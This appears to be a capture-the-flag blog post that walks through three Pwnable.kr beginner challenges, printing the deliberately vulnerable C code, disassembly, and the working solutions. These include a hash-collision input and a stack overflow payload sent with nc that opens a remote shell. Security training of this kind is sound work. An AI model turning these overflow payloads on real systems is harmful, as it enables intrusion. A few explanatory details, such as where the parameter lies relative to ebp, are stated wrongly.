---
layout: post
title: "[Pwnable.kr] Toddler's Bottle: fd, collision, bof"
date: 2017-09-11 12:00:00
share: true
comments: true
description: Walkthroughs for the first 3 Pwnable.kr challenges (fd, col, bof)
tags: [Exploit Development, Shellcoding, Pwnable.kr]
---

## Toddler's bottle: `fd`

Suggested reads: 
* <https://en.wikipedia.org/wiki/File_descriptor>

Vulnerable code with comments:

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
        // Do not accept less than 2 arguments (program name is one of them), print help and exit
		printf("pass argv[1] a number\n");
		return 0;
	}
	// atoi: convert a string array to integer
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
    
	// Read from file descriptor int(argv[1] - 0x1234)
	len = read(fd, buf, 32);
    
	// If strcmp("LETMEWIN\n", buf) returns 0 (matches), print flag
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```

We want `fd` to contain `STDIN_FILENO` which is one, then pass `LETMEWIN` as input. 

`atoi(argv[1]) = fd + 0x1234 = 0x1235 = 4661`

Okay, let's do this.

```cpp
fd@ubuntu:~$ ./fd 4661
LETMEWIN
good job :)
flag_for_fd_;)
```

---

## Toddler's Bottle: `collision`

Suggested reads:
* <https://users.cs.cf.ac.uk/Dave.Marshall/C/node10.html>
* <https://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Data/endian.html>

Vulnerable code with comments:

```cpp
#include <stdio.h>
#include <string.h>

unsigned long hashcode = 0x21DD09EC;

/* input: char pointer to argv[1]
 * char pointer is cast to an int pointer, 
 * basically if char* p = "1234" = "\x31\x32\x33\x34", int* ip = 0x34333231.
 * if you don't understand this check the suggested reads.
 */
 
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	// Iterate over the char array 4 bytes a time, sum them up
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){

	// Check there are at least two arguments (including file name)
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
    
	// Check arg[v] is of exactly 20 bytes
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	// if hashcode matches returned value, print flag
	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

Okay, assuming you read the comments you should know what we'll do. We want to pass 20 bytes than when cast to integers (5 of them, as a single int occupies 4 bytes), sum up to `0x21DD09EC`.

Easy way to do it is just come up with 5 null-free 4-byte characters.

`0x21DD 09EC = 0x1111 1111 + 0x0111 1111 + 0x0111 1111 + 0x0111 1111 + 0x011 1111 + 0x0D98 C5A8`

Easiest way to pass this as input is using python, and we have to respect endiannes.

```console
col@ubuntu:~$ ./col $(python -c 'print "\x11\x11\x11\x11" + "\x11\x11\x11\x01" * 3 + "\xa8\xc5\x98\x0d"')
flag_for_col_:)
```

Notice how we expressed the bytes in little-endian (values like `\x0d98c5a8` being represented as `\xa8\xc5\x98\x0d`.

---

## Toddler's Bottle: `bof`

To solve this challenge, you need to be familiar with memory layout in C, stack frames and how local variables/parameters are located.

Suggested reads (DO NOT SKIP):
* <http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/>
* <http://duartes.org/gustavo/blog/post/journey-to-the-stack/>

Vulnerable code with comments:

```cpp
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
    // Character array of size 32 bytes
	char overflowme[32];
	printf("overflow me : ");
    
    // Usage of gets() is interesting as it only stops reading on new line OR EOF character (null is ok)
	gets(overflowme);	// smash me!
    
    // key is located at [esp]
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

Although we have the source code, let's verify some stuff from the assembly generated:

```nasm
abatchy@ubuntu:~/Desktop/tmp$ objdump -M intel -D bof | grep -A20 func
0000062c <func>:
 62c:	55                   	push   ebp
 62d:	89 e5                	mov    ebp,esp
 62f:	83 ec 48             	sub    esp,0x48
 632:	65 a1 14 00 00 00    	mov    eax,gs:0x14
 638:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
 63b:	31 c0                	xor    eax,eax
 63d:	c7 04 24 8c 07 00 00 	mov    DWORD PTR [esp],0x78c
 644:	e8 fc ff ff ff       	call   645 <func+0x19>
 649:	8d 45 d4             	lea    eax,[ebp-0x2c]
 64c:	89 04 24             	mov    DWORD PTR [esp],eax
 64f:	e8 fc ff ff ff       	call   650 <func+0x24>
 654:	81 7d 08 be ba fe ca 	cmp    DWORD PTR [ebp+0x8],0xcafebabe
 65b:	75 0e                	jne    66b <func+0x3f>
 65d:	c7 04 24 9b 07 00 00 	mov    DWORD PTR [esp],0x79b
 664:	e8 fc ff ff ff       	call   665 <func+0x39>
 669:	eb 0c                	jmp    677 <func+0x4b>
 66b:	c7 04 24 a3 07 00 00 	mov    DWORD PTR [esp],0x7a3
 672:	e8 fc ff ff ff       	call   673 <func+0x47>
 677:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 67a:	65 33 05 14 00 00 00 	xor    eax,DWORD PTR gs:0x14
 681:	74 05                	je     688 <func+0x5c>
 683:	e8 fc ff ff ff       	call   684 <func+0x58>
 688:	c9                   	leave  
 689:	c3                   	ret

 
 ```

`overflowme` starts at `ebp-0x2c` based on instruction at `638`. Since it's a **local variable**, it's on a negative offset from `ebp`.

`key` is at `ebp+8` based on instruction at `654`. Since it's a **function parameter**, it's on a negative offset from `ebp`.

`gets()` doesn't give a single fuck what the size of the buffer passed to it is, and will stop reading only when it receives a new line or EOF character, which means if we send more than 32 bytes, it will keep overwriting more memory locations. 

What's the distance between `overflowme` and `key`? It's `|address_of_overflome - address_of_key|` = `|(ebp - 0x2c) - (ebp + 8)|` = 34h = 52 bytes. To overwrite `key`, we need an additional 4 bytes (size of int). Again, we need to pass the string in little-endian.


Next thing is that we want `key` to be equal to `0xcafebabe`, so buffer we'll be supplying is `52_bytes_garbage + "\xbe\xba\xfe\ca".

```console
abatchy@ubuntu:~/Desktop/tmp$ (python -c 'print "A" *  52 +"\xbe\xba\xfe\xca" + "\n"') |  nc pwnable.kr 9000
*** stack smashing detected ***: /home/bof/bof terminated
overflow me :
abatchy@ubuntu:~/Desktop/tmp$
```

Uhhh, why did it terminate? Well, `system()` just called bash, didn't find any input and terminated. How can we avoid that? With a simple trick that allows us to pass STDIN to it.

```console
abatchy@ubuntu:~/Desktop/tmp$ (python -c 'print "A" *  52 +"\xbe\xba\xfe\xca" + "\n"'; cat) | nc pwnable.kr 9000
whoami
bof
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
flag_for_bof_>:)
^C
```

Sweet.

**Note:** When function is about to exit, compiler insets a function epilogue which restores the execution flow, basically redirects the CPU to the next instruction in the caller function. The return address is stored on the stack frame, which means if it gets overwritten, the program will crash, or much worse...

\- Abatchy